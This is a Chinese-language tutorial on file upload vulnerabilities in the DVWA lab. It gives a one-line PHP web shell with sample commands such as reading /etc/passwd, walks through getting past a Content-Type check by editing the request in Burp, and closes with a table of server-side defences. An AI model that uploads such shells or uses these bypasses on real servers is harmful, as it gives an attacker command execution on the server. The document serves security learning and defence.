# 文件上传 · 从 getshell 到绕过类型校验

## 为什么危险

**SQL 注入读数据，XSS 打用户，文件上传拿服务器。** 三者危害等级递增。

能上传一个可执行脚本并被访问到，就等于拿到了服务器上的命令执行权限。

## Low 难度：直接上传

**一句话木马**（`shell.php`）：

```php
<?php echo shell_exec($_GET['cmd']); ?>
```

上传后访问：

```
http://127.0.0.1/DVWA/hackable/uploads/shell.php?cmd=whoami
```

返回 `www-data` —— **在服务器上执行了命令**。

再试：

```
?cmd=id
?cmd=ls /var/www/html
?cmd=cat /etc/passwd
```

## Medium 难度：绕过 Content-Type

直接传 `shell.php` 会被拒绝。源码逻辑大概是：

```php
if (($_FILES['uploaded']['type'] !== 'image/jpeg') &&
    ($_FILES['uploaded']['type'] !== 'image/png')) {
    echo "Your image was not uploaded.";
}
```

**它检查的是 `$_FILES[...]['type']`**，而 PHP 这个值取自客户端请求里的 `Content-Type` 字段——**完全由客户端控制**。

### 绕过步骤

1. Burp 打开 **Intercept is on**
2. 浏览器选 `shell.php` 点上传（浏览器会卡住，正常）
3. Burp 里找到请求：

```
Content-Disposition: form-data; name="uploaded"; filename="shell.php"
Content-Type: application/x-php      ← 改这一行
```

4. 改成：

```
Content-Type: image/jpeg
```

5. 点 **Forward**，上传成功

**只改一个字段，服务端就信了。**

### Burp 里的两个常用操作

| 功能 | 用途 |
|---|---|
| **Proxy → Intercept** | 拦截并修改请求后放行 |
| **Repeater** | 反复改同一个请求、看响应变化（改 SQL 注入参数就用它） |

> 注意：`Intercept is on` 时浏览器会一直转圈，这是 Burp 在等你放行。平时保持 off。

## High 难度（了解）

High 会用 `getimagesize()` 检查文件**内容**是不是真图片，单改 Content-Type 不行。常见思路是**图片马**（在图片文件末尾追加 PHP 代码）+ 配合文件包含漏洞执行。

## 防御（面试重点）

| 层级 | 措施 | 说明 |
|---|---|---|
| **最有效** | 上传目录**禁止解析脚本** | 改了 nginx/apache 配置，脚本传上去也执行不了 |
| **最有效** | 上传目录**不放在 web 根目录** | 或者设置成无执行权限 |
| 基础 | 扩展名白名单 | 只允许 jpg/png/pdf，不要用黑名单 |
| 补充 | 重命名文件 | 时间戳 + 随机串，避免可猜测路径 |
| 补充 | 校验文件内容 | `getimagesize()`、文件头魔数 |
| 兜底 | 上传大小限制、杀毒扫描 | — |

**很多人答反的地方**：最有效的不是"过滤后缀名"，是"**让上传目录根本不能执行脚本**"。

## 核心认知

> **前端的任何校验都在攻击者控制范围内。** 所有安全校验必须在服务端做。

用代理工具直接改请求，前端加了什么 JS 校验都没用。
